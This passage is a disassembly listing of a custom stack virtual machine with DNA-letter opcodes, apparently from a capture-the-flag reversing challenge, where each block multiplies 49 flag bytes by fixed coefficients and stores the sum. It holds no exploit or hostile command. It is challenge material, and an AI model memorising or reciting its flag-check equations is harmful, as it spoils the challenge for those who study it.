47) + ((flag[37] * 168) + ((flag[38] * 234) + ((flag[39] * 68) + ((flag[40] * 56) + ((flag[41] * 24) + ((flag[42] * 46) + ((flag[43] * 45) + ((flag[44] * 89) + ((flag[45] * 46) + ((flag[46] * 132) + ((flag[47] * 221) + (flag[48] * 86)))))))))))))))))))))))))))))))))))))))))))))))))\n091de : GTTTTGGTTTTT     push(mem[#0280])\n091ea : TTCCTCTTTTTT     push(#00000045)\n091f6 : GC               push(pop() * pop())\n091f8 : GTCTTGGTTTTT     push(mem[#0281])\n09204 : TTTATTTTTTTT     push(#0000000c)\n09210 : GC               push(pop() * pop())\n09212 : GTGTTGGTTTTT     push(mem[#0282])\n0921e : TTCATTTTTTTT     push(#0000000d)\n0922a : GC               push(pop() * pop())\n0922c : GTATTGGTTTTT     push(mem[#0283])\n09238 : TTCTGATTTTTT     push(#000000e1)\n09244 : GC               push(pop() * pop())\n09246 : GTTCTGGTTTTT     push(mem[#0284])\n09252 : TTACTCTTTTTT     push(#00000047)\n0925e : GC               push(pop() * pop())\n09260 : GTCCTGGTTTTT     push(mem[#0285])\n0926c : TTTATCTTTTTT     push(#0000004c)\n09278 : GC               push(pop() * pop())\n0927a : GTGCTGGTTTTT     push(mem[#0286])\n09286 : TTGAAATTTTTT     push(#000000fe)\n09292 : GC               push(pop() * pop())\n09294 : GTACTGGTTTTT     push(mem[#0287])\n092a0 : TTCGGGTTTTTT     push(#000000a9)\n092ac : GC               push(pop() * pop())\n092ae : GTTGTGGTTTTT     push(mem[#0288])\n092ba : TTGATCTTTTTT     push(#0000004e)\n092c6 : GC               push(pop() * pop())\n092c8 : GTCGTGGTTTTT     push(mem[#0289])\n092d4 : TTACTGTTTTTT     push(#00000087)\n092e0 : GC               push(pop() * pop())\n092e2 : GTGGTGGTTTTT     push(mem[#028a])\n092ee : TTGTCCTTTTTT     push(#00000052)\n092fa : GC               push(pop() * pop())\n092fc : GTAGTGGTTTTT     push(mem[#028b])\n09308 : TTCCTTTTTTTT     push(#00000005)\n09314 : GC               push(pop() * pop())\n09316 : GTTATGGTTTTT     push(mem[#028c])\n09322 : TTCTTATTTTTT     push(#000000c1)\n0932e : GC               push(pop() * pop())\n09330 : GTCATGGTTTTT     push(mem[#028d])\n0933c : TTACGATTTTTT     push(#000000e7)\n09348 : GC               push(pop() * pop())\n0934a : GTGATGGTTTTT     push(mem[#028e])\n09356 : TTCATGTTTTTT     push(#0000008d)\n09362 : GC               push(pop() * pop())\n09364 : GTAATGGTTTTT     push(mem[#028f])\n09370 : TTCCCGTTTTTT     push(#00000095)\n0937c : GC               push(pop() * pop())\n0937e : GTTTCGGTTTTT     push(mem[#0290])\n0938a : TTAGAATTTTTT     push(#000000fb)\n09396 : GC               push(pop() * pop())\n09398 : GTCTCGGTTTTT     push(mem[#0291])\n093a4 : TTCGCTTTTTTT     push(#00000019)\n093b0 : GC               push(pop() * pop())\n093b2 : GTGTCGGTTTTT     push(mem[#0292])\n093be : TTTCTGTTTTTT     push(#00000084)\n093ca : GC               push(pop() * pop())\n093cc : GTATCGGTTTTT     push(mem[#0293])\n093d8 : TTGGCTTTTTTT     push(#0000001a)\n093e4 : GC               push(pop() * pop())\n093e6 : GTTCCGGTTTTT     push(mem[#0294])\n093f2 : TTCGATTTTTTT     push(#00000039)\n093fe : GC               push(pop() * pop())\n09400 : GTCCCGGTTTTT     push(mem[#0295])\n0940c : TTGACATTTTTT     push(#000000de)\n09418 : GC               push(pop() * pop())\n0941a : GTGCCGGTTTTT     push(mem[#0296])\n09426 : TTGGCTTTTTTT     push(#0000001a)\n09432 : GC               push(pop() * pop())\n09434 : GTACCGGTTTTT     push(mem[#0297])\n09440 : TTGTCATTTTTT     push(#000000d2)\n0944c : GC               push(pop() * pop())\n0944e : GTTGCGGTTTTT     push(mem[#0298])\n0945a : TTGGGTTTTTTT     push(#0000002a)\n09466 : GC               push(pop() * pop())\n09468 : GTCGCGGTTTTT     push(mem[#0299])\n09474 : TTGGTGTTTTTT     push(#0000008a)\n09480 : GC               push(pop() * pop())\n09482 : GTGGCGGTTTTT     push(mem[#029a])\n0948e : TTCTCGTTTTTT     push(#00000091)\n0949a : GC               push(pop() * pop())\n0949c : GTAGCGGTTTTT     push(mem[#029b])\n094a8 : TTAAGTTTTTTT     push(#0000002f)\n094b4 : GC               push(pop() * pop())\n094b6 : GTTACGGTTTTT     push(mem[#029c])\n094c2 : TTCGTATTTTTT     push(#000000c9)\n094ce : GC               push(pop() * pop())\n094d0 : GTCACGGTTTTT     push(mem[#029d])\n094dc : TTAGATTTTTTT     push(#0000003b)\n094e8 : GC               push(pop() * pop())\n094ea : GTGACGGTTTTT     push(mem[#029e])\n094f6 : TTACTGTTTTTT     push(#00000087)\n09502 : GC               push(pop() * pop())\n09504 : GTAACGGTTTTT     push(mem[#029f])\n09510 : TTACTCTTTTTT     push(#00000047)\n0951c : GC               push(pop() * pop())\n0951e : GTTTGGGTTTTT     push(mem[#02a0])\n0952a : TTTTGGTTTTTT     push(#000000a0)\n09536 : GC               push(pop() * pop())\n09538 : GTCTGGGTTTTT     push(mem[#02a1])\n09544 : TTCTTGTTTTTT     push(#00000081)\n09550 : GC               push(pop() * pop())\n09552 : GTGTGGGTTTTT     push(mem[#02a2])\n0955e : TTAAACTTTTTT     push(#0000007f)\n0956a : GC               push(pop() * pop())\n0956c : GTATGGGTTTTT     push(mem[#02a3])\n09578 : TTCAGTTTTTTT     push(#0000002d)\n09584 : GC               push(pop() * pop())\n09586 : GTTCGGGTTTTT     push(mem[#02a4])\n09592 : TTAAGTTTTTTT     push(#0000002f)\n0959e : GC               push(pop() * pop())\n095a0 : GTCCGGGTTTTT     push(mem[#02a5])\n095ac : TTACCGTTTTTT     push(#00000097)\n095b8 : GC               push(pop() * pop())\n095ba : GTGCGGGTTTTT     push(mem[#02a6])\n095c6 : TTGCATTTTTTT     push(#00000036)\n095d2 : GC               push(pop() * pop())\n095d4 : GTACGGGTTTTT     push(mem[#02a7])\n095e0 : TTCTAATTTTTT     push(#000000f1)\n095ec : GC               push(pop() * pop())\n095ee : GTTGGGGTTTTT     push(mem[#02a8])\n095fa : TTCGATTTTTTT     push(#00000039)\n09606 : GC               push(pop() * pop())\n09608 : GTCGGGGTTTTT     push(mem[#02a9])\n09614 : TTAGCATTTTTT     push(#000000db)\n09620 : GC               push(pop() * pop())\n09622 : GTGGGGGTTTTT     push(mem[#02aa])\n0962e : TTACTCTTTTTT     push(#00000047)\n0963a : GC               push(pop() * pop())\n0963c : GTAGGGGTTTTT     push(mem[#02ab])\n09648 : TTTGAATTTTTT     push(#000000f8)\n09654 : GC               push(pop() * pop())\n09656 : GTTAGGGTTTTT     push(mem[#02ac])\n09662 : TTCATCTTTTTT     push(#0000004d)\n0966e : GC               push(pop() * pop())\n09670 : GTCAGGGTTTTT     push(mem[#02ad])\n0967c : TTAGCCTTTTTT     push(#0000005b)\n09688 : GC               push(pop() * pop())\n0968a : GTGAGGGTTTTT     push(mem[#02ae])\n09696 : TTTAGTTTTTTT     push(#0000002c)\n096a2 : GC               push(pop() * pop())\n096a4 : GTAAGGGTTTTT     push(mem[#02af])\n096b0 : TTCTCGTTTTTT     push(#00000091)\n096bc : GC               push(pop() * pop())\n096be : GTTTAGGTTTTT     push(mem[#02b0])\n096ca : TTTTAGTTTTTT     push(#000000b0)\n096d6 : GC               push(pop() * pop())\n096d8 : TC               push(pop() + pop())\n096da : TC               push(pop() + pop())\n096dc : TC               push(pop() + pop())\n096de : TC               push(pop() + pop())\n096e0 : TC               push(pop() + pop())\n096e2 : TC               push(pop() + pop())\n096e4 : TC               push(pop() + pop())\n096e6 : TC               push(pop() + pop())\n096e8 : TC               push(pop() + pop())\n096ea : TC               push(pop() + pop())\n096ec : TC               push(pop() + pop())\n096ee : TC               push(pop() + pop())\n096f0 : TC               push(pop() + pop())\n096f2 : TC               push(pop() + pop())\n096f4 : TC               push(pop() + pop())\n096f6 : TC               push(pop() + pop())\n096f8 : TC               push(pop() + pop())\n096fa : TC               push(pop() + pop())\n096fc : TC               push(pop() + pop())\n096fe : TC               push(pop() + pop())\n09700 : TC               push(pop() + pop())\n09702 : TC               push(pop() + pop())\n09704 : TC               push(pop() + pop())\n09706 : TC               push(pop() + pop())\n09708 : TC               push(pop() + pop())\n0970a : TC               push(pop() + pop())\n0970c : TC               push(pop() + pop())\n0970e : TC               push(pop() + pop())\n09710 : TC               push(pop() + pop())\n09712 : TC               push(pop() + pop())\n09714 : TC               push(pop() + pop())\n09716 : TC               push(pop() + pop())\n09718 : TC               push(pop() + pop())\n0971a : TC               push(pop() + pop())\n0971c : TC               push(pop() + pop())\n0971e : TC               push(pop() + pop())\n09720 : TC               push(pop() + pop())\n09722 : TC               push(pop() + pop())\n09724 : TC               push(pop() + pop())\n09726 : TC               push(pop() + pop())\n09728 : TC               push(pop() + pop())\n0972a : TC               push(pop() + pop())\n0972c : TC               push(pop() + pop())\n0972e : TC               push(pop() + pop())\n09730 : TC               push(pop() + pop())\n09732 : TC               push(pop() + pop())\n09734 : TC               push(pop() + pop())\n09736 : TC               push(pop() + pop())\n09738 : ATTAGCTTCTTT     mem[#106c] := pop()           memory[#0106c] := ((flag[0] * 69) + ((flag[1] * 12) + ((flag[2] * 13) + ((flag[3] * 225) + ((flag[4] * 71) + ((flag[5] * 76) + ((flag[6] * 254) + ((flag[7] * 169) + ((flag[8] * 78) + ((flag[9] * 135) + ((flag[10] * 82) + ((flag[11] * 5) + ((flag[12] * 193) + ((flag[13] * 231) + ((flag[14] * 141) + ((flag[15] * 149) + ((flag[16] * 251) + ((flag[17] * 25) + ((flag[18] * 132) + ((flag[19] * 26) + ((flag[20] * 57) + ((flag[21] * 222) + ((flag[22] * 26) + ((flag[23] * 210) + ((flag[24] * 42) + ((flag[25] * 138) + ((flag[26] * 145) + ((flag[27] * 47) + ((flag[28] * 201) + ((flag[29] * 59) + ((flag[30] * 135) + ((flag[31] * 71) + ((flag[32] * 160) + ((flag[33] * 129) + ((flag[34] * 127) + ((flag[35] * 45) + ((flag[36] * 47) + ((flag[37] * 151) + ((flag[38] * 54) + ((flag[39] * 241) + ((flag[40] * 57) + ((flag[41] * 219) + ((flag[42] * 71) + ((flag[43] * 248) + ((flag[44] * 77) + ((flag[45] * 91) + ((flag[46] * 44) + ((flag[47] * 145) + (flag[48] * 176)))))))))))))))))))))))))))))))))))))))))))))))))\n09744 : GTTTTGGTTTTT     push(mem[#0280])\n09750 : TTTTAATTTTTT     push(#000000f0)\n0975c : GC               push(pop() * pop())\n0975e : GTCTTGGTTTTT     push(mem[#0281])\n0976a : TTTCGGTTTTTT     push(#000000a4)\n09776 : GC               push(pop() * pop())\n09778 : GTGTTGGTTTTT     push(mem[#0282])\n09784 : TTCAGTTTTTTT     push(#0000002d)\n09790 : GC               push(pop() * pop())\n09792 : GTATTGGTTTTT     push(mem[#0283])\n0979e : TTCAACTTTTTT     push(#0000007d)\n097aa : GC               push(pop() * pop())\n097ac : GTTCTGGTTTTT     push(mem[#0284])\n097b8 : TTCCGCTTTTTT     push(#00000065)\n097c4 : GC               push(pop() * pop())\n097c6 : GTCCTGGTTTTT     push(mem[#0285])\n097d2 : TTTCGATTTTTT     push(#000000e4)\n097de : GC               push(pop() * pop())\n097e0 : GTGCTGGTTTTT     push(mem[#0286])\n097ec : TTGTATTTTTTT     push(#00000032)\n097f8 : GC               push(pop() * pop())\n097fa : GTACTGGTTTTT     push(mem[#0287])\n09806 : TTCACATTTTTT     push(#000000dd)\n09812 : GC               push(pop() * pop())\n09814 : GTTGTGGTTTTT     push(mem[#0288])\n09820 : TTCTGGTTTTTT     push(#000000a1)\n0982c : GC               push(pop() * pop())\n0982e : GTCGTGGTTTTT     push(mem[#0289])\n0983a : TTAAGGTTTTTT     push(#000000af)\n09846 : GC               push(pop() * pop())\n09848 : GTGGTGGTTTTT     push(mem[#028a])\n09854 : TTAGGATTTTTT     push(#000000eb)\n09860 : GC               push(pop() * pop())\n09862 : GTAGTGGTTTTT     push(mem[#028b])\n0986e : TTTACCTTTTTT     push(#0000005c)\n0987a : GC               push(pop() * pop())\n0987c : GTTATGGTTTTT     push(mem[#028c])\n09888 : TTCTTCTTTTTT     push(#00000041)\n09894 : GC               push(pop() * pop())\n09896 : GTCATGGTTTTT     push(mem[#028d])\n098a2 : TTCCGATTTTTT     push(#000000e5)\n098ae : GC               push(pop() * pop())\n098b0 : GTGATGGTTTTT     push(mem[#028e])\n098bc : TTTTTGTTTTTT     push(#00000080)\n098c8 : GC               push(pop() * pop())\n098ca : GTAATGGTTTTT     push(mem[#028f])\n098d6 : TTGATTTTTTTT     push(#0000000e)\n098e2 : GC               push(pop() * pop())\n098e4 : GTTTCGGTTTTT     push(mem[#0290])\n098f0 : TTGAAATTTTTT     push(#000000fe)\n098fc : GC               push(pop() * pop())\n098fe : GTCTCGGTTTTT     push(mem[#0291])\n0990a : TTTTCGTTTTTT     push(#00000090)\n09916 : GC               push(pop() * pop())\n09918 : GTGTCGGTTTTT     push(mem[#0292])\n09924 : TTCGTTTTTTTT     push(#00000009)\n09930 : GC               push(pop() * pop())\n09932 : GTATCGGTTTTT     push(mem[#0293])\n0993e : TTATCGTTTTTT     push(#00000093)\n0994a : GC               push(pop() * pop())\n0994c : GTTCCGGTTTTT     push(mem[#0294])\n09958 : TTTCTTTTTTTT     push(#00000004)\n09964 : GC               push(pop() * pop())\n09966 : GTCCCGGTTTTT     push(mem[#0295])\n09972 : TTGCTTTTTTTT     push(#00000006)\n0997e : GC               push(pop() * pop())\n09980 : GTGCCGGTTTTT     push(mem[#0296])\n0998c : TTTGCGTTTTTT     push(#00000098)\n09998 : GC               push(pop() * pop())\n0999a : GTACCGGTTTTT     push(mem[#0297])\n099a6 : TTGTTCTTTTTT     push(#00000042)\n099b2 : GC               push(pop() * pop())\n099b4 : GTTGCGGTTTTT     push(mem[#0298])\n099c0 : TTATCGTTTTTT     push(#00000093)\n099cc : GC               push(pop() * pop())\n099ce : GTCGCGGTTTTT     push(mem[#0299])\n099da : TTCACGTTTTTT     push(#0000009d)\n099e6 : GC               push(pop() * pop())\n099e8 : GTGGCGGTTTTT     push(mem[#029a])\n099f4 : TTCTTATTTTTT     push(#000000c1)\n09a00 : GC               push(pop() * pop())\n09a02 : GTAGCGGTTTTT     push(mem[#029b])\n09a0e : TTCCCCTTTTTT     push(#00000055)\n09a1a : GC               push(pop() * pop())\n09a1c : GTTACGGTTTTT     push(mem[#029c])\n09a28 : TTCAAATTTTTT     push(#000000fd)\n09a34 : GC               push(pop() * pop())\n09a36 : GTCACGGTTTTT     push(mem[#029d])\n09a42 : TTGAGGTTTTTT     push(#000000ae)\n09a4e : GC               push(pop() * pop())\n09a50 : GTGACGGTTTTT     push(mem[#029e])\n09a5c : TTTTACTTTTTT     push(#00000070)\n09a68 : GC               push(pop() * pop())\n09a6a : GTAACGGTTTTT     push(mem[#029f])\n09a76 : TTCCAGTTTTTT     push(#000000b5)\n09a82 : GC               push(pop() * pop())\n09a84 : GTTTGGGTTTTT     push(mem[#02a0])\n09a90 : TTGCCCTTTTTT     push(#00000056)\n09a9c : GC               push(pop() * pop())\n09a9e : GTCTGGGTTTTT     push(mem[#02a1])\n09aaa : TTGACGTTTTTT     push(#0000009e)\n09ab6 : GC               push(pop() * pop())\n09ab8 : GTGTGGGTTTTT     push(mem[#02a2])\n09ac4 : TTGGCCTTTTTT     push(#0000005a)\n09ad0 : GC               push(pop() * pop())\n09ad2 : GTATGGGTTTTT     push(mem[#02a3])\n09ade : TTGGGTTTTTTT     push(#0000002a)\n09aea : GC               push(pop() * pop())\n09aec : GTTCGGGTTTTT     push(mem[#02a4])\n09af8 : TTGACCTTTTTT     push(#0000005e)\n09b04 : GC               push(pop() * pop())\n09b06 : GTCCGGGTTTTT     push(mem[#02a5])\n09b12 : TTTCAATTTTTT     push(#000000f4)\n09b1e : GC               push(pop() * pop())\n09b20 : GTGCGGGTTTTT     push(mem[#02a6])\n09b2c : TTGGATTTTTTT     push(#0000003a)\n09b38 : GC               push(pop() * pop())\n09b3a : GTACGGGTTTTT     push(mem[#02a7])\n09b46 : TTCAACTTTTTT     push(#0000007d)\n09b52 : GC               push(pop() * pop())\n09b54 : GTTGGGGTTTTT     push(mem[#02a8])\n09b60 : TTACTATTTTTT     push(#000000c7)\n09b6c : GC               push(pop() * pop())\n09b6e : GTCGGGGTTTTT     push(mem[#02a9])\n09b7a : TTAAGCTTTTTT     push(#0000006f)\n09b86 : GC               push(pop() * pop())\n09b88 : GTGGGGGTTTTT     push(mem[#02aa])\n09b94 : TTTGTTTTTTTT     push(#00000008)\n09ba0 : GC               push(pop() * pop())\n09ba2 : GTAGGGGTTTTT     push(mem[#02ab])\n09bae : TTCGCCTTTTTT     push(#00000059)\n09bba : GC               push(pop() * pop())\n09bbc : GTTAGGGTTTTT     push(mem[#02ac])\n09bc8 : TTCCGTTTTTTT     push(#00000025)\n09bd4 : GC               push(pop() * pop())\n09bd6 : GTCAGGGTTTTT     push(mem[#02ad])\n09be2 : TTGGCATTTTTT     push(#000000da)\n09bee : GC               push(pop() * pop())\n09bf0 : GTGAGGGTTTTT     push(mem[#02ae])\n09bfc : TTCGTTTTTTTT     push(#00000009)\n09c08 : GC               push(pop() * pop())\n09c0a : GTAAGGGTTTTT     push(mem[#02af])\n09c16 : TTTGTATTTTTT     push(#000000c8)\n09c22 : GC               push(pop() * pop())\n09c24 : GTTTAGGTTTTT     push(mem[#02b0])\n09c30 : TTGTATTTTTTT     push(#00000032)\n09c3c : GC               push(pop() * pop())\n09c3e : TC               push(pop() + pop())\n09c40 : TC               push(pop() + pop())\n09c42 : TC               push(pop() + pop())\n09c44 : TC               push(pop() + pop())\n09c46 : TC               push(pop() + pop())\n09c48 : TC               push(pop() + pop())\n09c4a : TC               push(pop() + pop())\n09c4c : TC               push(pop() + pop())\n09c4e : TC               push(pop() + pop())\n09c50 : TC               push(pop() + pop())\n09c52 : TC               push(pop() + pop())\n09c54 : TC               push(pop() + pop())\n09c56 : TC               push(pop() + pop())\n09c58 : TC               push(pop() + pop())\n09c5a : TC               push(pop() + pop())\n09c5c : TC               push(pop() + pop())\n09c5e : TC               push(pop() + pop())\n09c60 : TC               push(pop() + pop())\n09c62 : TC               push(pop() + pop())\n09c64 : TC               push(pop() + pop())\n09c66 : TC               push(pop() + pop())\n09c68 : TC               push(pop() + pop())\n09c6a : TC               push(pop() + pop())\n09c6c : TC               push(pop() + pop())\n09c6e : TC               push(pop() + pop())\n09c70 : TC               push(pop() + pop())\n09c72 : TC               push(pop() + pop())\n09c74 : TC               push(pop() + pop())\n09c76 : TC               push(pop() + pop())\n09c78 : TC               push(pop() + pop())\n09c7a : TC               push(pop() + pop())\n09c7c : TC               push(pop() + pop())\n09c7e : TC               push(pop() + pop())\n09c80 : TC               push(pop() + pop())\n09c82 : TC               push(pop() + pop())\n09c84 : TC               push(pop() + pop())\n09c86 : TC               push(pop() + pop())\n09c88 : TC               push(pop() + pop())\n09c8a : TC               push(pop() + pop())\n09c8c : TC               push(pop() + pop())\n09c8e : TC               push(pop() + pop())\n09c90 : TC               push(pop() + pop())\n09c92 : TC               push(pop() + pop())\n09c94 : TC               push(pop() + pop())\n09c96 : TC               push(pop() + pop())\n09c98 : TC               push(pop() + pop())\n09c9a : TC               push(pop() + pop())\n09c9c : TC               push(pop() + pop())\n09c9e : ATTTACTTCTTT     mem[#1070] := pop()           memory[#01070] := ((flag[0] * 240) + ((flag[1] * 164) + ((flag[2] * 45) + ((flag[3] * 125) + ((flag[4] * 101) + ((flag[5] * 228) + ((flag[6] * 50) + ((flag[7] * 221) + ((flag[8] * 161) + ((flag[9] * 175) + ((flag[10] * 235) + ((flag[11] * 92) + ((flag[12] * 65) + ((flag[13] * 229) + ((flag[14] * 128) + ((flag[15] * 14) + ((flag[16] * 254) + ((flag[17] * 144) + ((flag[18] * 9) + ((flag[19] * 147) + ((flag[20] * 4) + ((flag[21] * 6) + ((flag[22] * 152) + ((flag[23] * 66) + ((flag[24] * 147) + ((flag[25] * 157) + ((flag[26] * 193) + ((flag[27] * 85) + ((flag[28] * 253) + ((flag[29] * 174) + ((flag[30] * 112) + ((flag[31] * 181) + ((flag[32] * 86) + ((flag[33] * 158) + ((flag[34] * 90) + ((flag[35] * 42) + ((flag[36] * 94) + ((flag[37] * 244) + ((flag[38] * 58) + ((flag[39] * 125) + ((flag[40] * 199) + ((flag[41] * 111) + ((flag[42] * 8) + ((flag[43] * 89) + ((flag[44] * 37) + ((flag[45] * 218) + ((flag[46] * 9) + ((flag[47] * 200) + (flag[48] * 50)))))))))))))))))))))))))))))))))))))))))))))))))\n09caa : GTTTTGGTTTTT     push(mem[#0280])\n09cb6 : TTGTAGTTTTTT     push(#000000b2)\n09cc2 : GC               push(pop() * pop())\n09cc4 : GTCTTGGTTTTT     push(mem[#0281])\n09cd0 : TTACAATTTTTT     push(#000000f7)\n09cdc : GC               push(pop() * pop())\n09cde : GTGTTGGTTTTT     push(mem[#0282])\n09cea : TTGGGATTTTTT     push(#000000ea)\n09cf6 : GC               push(pop() * pop())\n09cf8 : GTATTGGTTTTT     push(mem[#0283])\n09d04 : TTCCCTTTTTTT     push(#00000015)\n09d10 : GC               push(pop() * pop())\n09d12 : GTTCTGGTTTTT     push(mem[#0284])\n09d1e : TTAGAATTTTTT     push(#000000fb)\n09d2a : GC               push(pop() * pop())\n09d2c : GTCCTGGTTTTT     push(mem[#0285])\n09d38 : TTTATCTTTTTT     push(#0000004c)\n09d44 : GC               push(pop() * pop())\n09d46 : GTGCTGGTTTTT     push(mem[#0286])\n09d52 : TTCCTTTTTTTT     push(#00000005)\n09d5e : GC               push(pop() * pop())\n09d60 : GTACTGGTTTTT     push(mem[#0287])\n09d6c : TTAAGGTTTTTT     push(#000000af)\n09d78 : GC               push(pop() * pop())\n09d7a : GTTGTGGTTTTT     push(mem[#0288])\n09d86 : TTCGGCTTTTTT     push(#00000069)\n09d92 : GC               push(pop() * pop())\n09d94 : GTCGTGGTTTTT     push(mem[#0289])\n09da0 : TTGCCTTTTTTT     push(#00000016)\n09dac : GC               push(pop() * pop())\n09dae : GTGGTGGTTTTT     push(mem[#028a])\n09dba : TTATATTTTTTT     push(#00000033)\n09dc6 : GC               push(pop() * pop())\n09dc8 : GTAGTGGTTTTT     push(mem[#028b])\n09dd4 : TTAGTGTTTTTT     push(#0000008b)\n09de0 : GC               push(pop() * pop())\n09de2 : GTTATGGTTTTT     push(mem[#028c])\n09dee : TTTCAATTTTTT     push(#000000f4)\n09dfa : GC               push(pop() * pop())\n09dfc : GTCATGGTTTTT     push(mem[#028d])\n09e08 : TTGTCGTTTTTT     push(#00000092)\n09e14 : GC               push(pop() * pop())\n09e16 : GTGATGGTTTTT     push(mem[#028e])\n09e22 : TTGCCTTTTTTT     push(#00000016)\n09e2e : GC               push(pop() * pop())\n09e30 : GTAATGGTTTTT     push(mem[#028f])\n09e3c : TTGGTATTTTTT     push(#000000ca)\n09e48 : GC               push(pop() * pop())\n09e4a : GTTTCGGTTTTT     push(mem[#0290])\n09e56 : TTGCATTTTTTT     push(#00000036)\n09e62 : GC               push(pop() * pop())\n09e64 : GTCTCGGTTTTT     push(mem[#0291])\n09e70 : TTCTTCTTTTTT     push(#00000041)\n09e7c : GC               push(pop() * pop())\n09e7e : GTGTCGGTTTTT     push(mem[#0292])\n09e8a : TTTATCTTTTTT     push(#0000004c)\n09e96 : GC               push(pop() * pop())\n09e98 : GTATCGGTTTTT     push(mem[#0293])\n09ea4 : TTAGGTTTTTTT     push(#0000002b)\n09eb0 : GC               push(pop() * pop())\n09eb2 : GTTCCGGTTTTT     push(mem[#0294])\n09ebe : TTCATATTTTTT     push(#000000cd)\n09eca : GC               push(pop() * pop())\n09ecc : GTCCCGGTTTTT     push(mem[#0295])\n09ed8 : TTGCCCTTTTTT     push(#00000056)\n09ee4 : GC               push(pop() * pop())\n09ee6 : GTGCCGGTTTTT     push(mem[#0296])\n09ef2 : TTGACGTTTTTT     push(#0000009e)\n09efe : GC               push(pop() * pop())\n09f00 : GTACCGGTTTTT     push(mem[#0297])\n09f0c : TTTAACTTTTTT     push(#0000007c)\n09f18 : GC               push(pop() * pop())\n09f1a : GTTGCGGTTTTT     push(mem[#0298])\n09f26 : TTACTCTTTTTT     push(#00000047)\n09f32 : GC               push(pop() * pop())\n09f34 : GTCGCGGTTTTT     push(mem[#0299])\n09f40 : TTGTAGTTTTTT     push(#000000b2)\n09f4c : GC               push(pop() * pop())\n09f4e : GTGGCGGTTTTT     push(mem[#029a])\n09f5a : TTATTCTTTTTT     push(#00000043)\n09f66 : GC               push(pop() * pop())\n09f68 : GTAGCGGTTTTT     push(mem[#029b])\n09f74 : TTGTTTTTTTTT     push(#00000002)\n09f80 : GC               push(pop() * pop())\n09f82 : GTTACGGTTTTT     push(mem[#029c])\n09f8e : TTTTTCTTTTTT     push(#00000040)\n09f9a : GC               push(pop() * pop())\n09f9c : GTCACGGTTTTT     push(mem[#029d])\n09fa8 : TTCGACTTTTTT     push(#00000079)\n09fb4 : GC               push(pop() * pop())\n09fb6 : GTGACGGTTTTT     push(mem[#029e])\n09fc2 : TTCATTTTTTTT     push(#0000000d)\n09fce : GC               push(pop() * pop())\n09fd0 : GTAACGGTTTTT     push(mem[#029f])\n09fdc : TTTATCTTTTTT     push(#0000004c)\n09fe8 : GC               push(pop() * pop())\n09fea : GTTTGGGTTTTT     push(mem[#02a0])\n09ff6 : TTTAGCTTTTTT     push(#0000006c)\n0a002 : GC               push(pop() * pop())\n0a004 : GTCTGGGTTTTT     push(mem[#02a1])\n0a010 : TTCACTTTTTTT     push(#0000001d)\n0a01c : GC               push(pop() * pop())\n0a01e : GTGTGGGTTTTT     push(mem[#02a2])\n0a02a : TTCTTATTTTTT     push(#000000c1)\n0a036 : GC               push(pop() * pop())\n0a038 : GTATGGGTTTTT     push(mem[#02a3])\n0a044 : TTGTACTTTTTT     push(#00000072)\n0a050 : GC               push(pop() * pop())\n0a052 : GTTCGGGTTTTT     push(mem[#02a4])\n0a05e : TTTTATTTTTTT     push(#00000030)\n0a06a : GC               push(pop() * pop())\n0a06c : GTCCGGGTTTTT     push(mem[#02a5])\n0a078 : TTACGCTTTTTT     push(#00000067)\n0a084 : GC               push(pop() * pop())\n0a086 : GTGCGGGTTTTT     push(mem[#02a6])\n0a092 : TTAGCATTTTTT     push(#000000db)\n0a09e : GC               push(pop() * pop())\n0a0a0 : GTACGGGTTTTT     push(mem[#02a7])\n0a0ac : TTAAGCTTTTTT     push(#0000006f)\n0a0b8 : GC               push(pop() * pop())\n0a0ba : GTTGGGGTTTTT     push(mem[#02a8])\n0a0c6 : TTATTGTTTTTT     push(#00000083)\n0a0d2 : GC               push(pop() * pop())\n0a0d4 : GTCGGGGTTTTT     push(mem[#02a9])\n0a0e0 : TTGGACTTTTTT     push(#0000007a)\n0a0ec : GC               push(pop() * pop())\n0a0ee : GTGGGGGTTTTT     push(mem[#02aa])\n0a0fa : TTTAACTTTTTT     push(#0000007c)\n0a106 : GC               push(pop() * pop())\n0a108 : GTAGGGGTTTTT     push(mem[#02ab])\n0a114 : TTACGGTTTTTT     push(#000000a7)\n0a120 : GC               push(pop() * pop())\n0a122 : GTTAGGGTTTTT     push(mem[#02ac])\n0a12e : TTATCCTTTTTT     push(#00000053)\n0a13a : GC               push(pop() * pop())\n0a13c : GTCAGGGTTTTT     push(mem[#02ad])\n0a148 : TTCGCATTTTTT     push(#000000d9)\n0a154 : GC               push(pop() * pop())\n0a156 : GTGAGGGTTTTT     push(mem[#02ae])\n0a162 : TTAGTTTTTTTT     push(#0000000b)\n0a16e : GC               push(pop() * pop())\n0a170 : GTAAGGGTTTTT     push(mem[#02af])\n0a17c : TTGAGCTTTTTT     push(#0000006e)\n0a188 : GC               push(pop() * pop())\n0a18a : GTTTAGGTTTTT     push(mem[#02b0])\n0a196 : TTTGGATTTTTT     push(#000000e8)\n0a1a2 : GC               push(pop() * pop())\n0a1a4 : TC               push(pop() + pop())\n0a1a6 : TC               push(pop() + pop())\n0a1a8 : TC               push(pop() + pop())\n0a1aa : TC               push(pop() + pop())\n0a1ac : TC               push(pop() + pop())\n0a1ae : TC               push(pop() + pop())\n0a1b0 : TC               push(pop() + pop())\n0a1b2 : TC               push(pop() + pop())\n0a1b4 : TC               push(pop() + pop())\n0a1b6 : TC               push(pop() + pop())\n0a1b8 : TC               push(pop() + pop())\n0a1ba : TC               push(pop() + pop())\n0a1bc : TC               push(pop() + pop())\n0a1be : TC               push(pop() + pop())\n0a1c0 : TC               push(pop() + pop())\n0a1c2 : TC               push(pop() + pop())\n0a1c4 : TC               push(pop() + pop())\n0a1c6 : TC               push(pop() + pop())\n0a1c8 : TC               push(pop() + pop())\n0a1ca : TC               push(pop() + pop())\n0a1cc : TC               push(pop() + pop())\n0a1ce : TC               push(pop() + pop())\n0a1d0 : TC               push(pop() + pop())\n0a1d2 : TC               push(pop() + pop())\n0a1d4 : TC               push(pop() + pop())\n0a1d6 : TC               push(pop() + pop())\n0a1d8 : TC               push(pop() + pop())\n0a1da : TC               push(pop() + pop())\n0a1dc : TC               push(pop() + pop())\n0a1de : TC               push(pop() + pop())\n0a1e0 : TC               push(pop() + pop())\n0a1e2 : TC               push(pop() + pop())\n0a1e4 : TC               push(pop() + pop())\n0a1e6 : TC               push(pop() + pop())\n0a1e8 : TC               push(pop() + pop())\n0a1ea : TC               push(pop() + pop())\n0a1ec : TC               push(pop() + pop())\n0a1ee : TC               push(pop() + pop())\n0a1f0 : TC               push(pop() + pop())\n0a1f2 : TC               push(pop() + pop())\n0a1f4 : TC               push(pop() + pop())\n0a1f6 : TC               push(pop() + 